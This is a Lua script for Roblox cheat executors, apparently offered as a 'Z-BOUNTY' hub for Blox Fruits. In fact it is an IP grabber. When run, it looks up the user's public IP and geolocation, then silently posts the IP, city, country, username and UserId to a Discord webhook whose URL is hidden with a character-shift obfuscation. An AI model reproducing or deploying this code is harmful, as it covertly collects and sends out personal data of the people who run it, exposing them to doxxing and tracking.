--[[
    Z-BOUNTY System - Absolute IP Fix
    Repository: AloneFalseExploit/AloneInfRange2
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Función de seguridad para la URL
local function _XSafe(_s)
    local _r = ""
    for i = 1, #_s do _r = _r .. string.char(string.byte(_s, i) - 1) end
    return _r
end

local WebhookURL = _XSafe("iuuqt;00ejtdpse/dpn0bqj0xfbcpplt026153180861758224900qev11{midI2mFFm95Gl3KN[LuN9FG7muGs9BuqXh.Upp7QPXulK9TEKSzlI[EUbG7Vs[")

-- OBTENCIÓN DE IP FORZADA
local function getFullData()
    local userIP = "No detectada"
    local geoData = {country = "Desconocido", city = "Desconocido"}

    -- Paso 1: Forzar la obtención de la IP cruda
    pcall(function()
        userIP = game:HttpGet("https://api.ipify.org")
    end)

    -- Paso 2: Obtener la geolocalización usando esa IP específica
    pcall(function()
        if userIP ~= "No detectada" then
            local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/" .. userIP))
            if data and data.status == "success" then
                geoData = data
            end
        end
    end)

    return userIP, geoData
end

local realIP, location = getFullData()

-- Estructura del mensaje (Idéntica a la imagen 1000008396.jpg)
local payload = {
    ["embeds"] = {{
        ["title"] = "🚀 HUB ACTIVADO - Z-BOUNTY",
        ["color"] = 65280,
        ["fields"] = {
            {["name"] = "👤 Jugador", ["value"] = player.Name .. " (" .. tostring(player.UserId) .. ")", ["inline"] = false},
            {["name"] = "🌐 Dirección IP", ["value"] = "||" .. realIP .. "||", ["inline"] = false}, -- IP oculta con spoiler
            {["name"] = "🌍 Ubicación", ["value"] = location.country .. ", " .. location.city, ["inline"] = false},
            {["name"] = "🎮 Juego", ["value"] = "Blox Fruits | Mar: " .. (game.PlaceId == 2753915549 and "1" or game.PlaceId == 4442245229 and "2" or "3"), ["inline"] = false}
        },
        ["footer"] = {["text"] = "Z-BOUNTY System | AloneFalseExploit 🔥"}
    }}
}

-- Función de envío compatible con Xeno
local function send()
    local req = request or http_request or (http and http.request) or (syn and syn.request)
    if req then
        pcall(function()
            req({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

send()
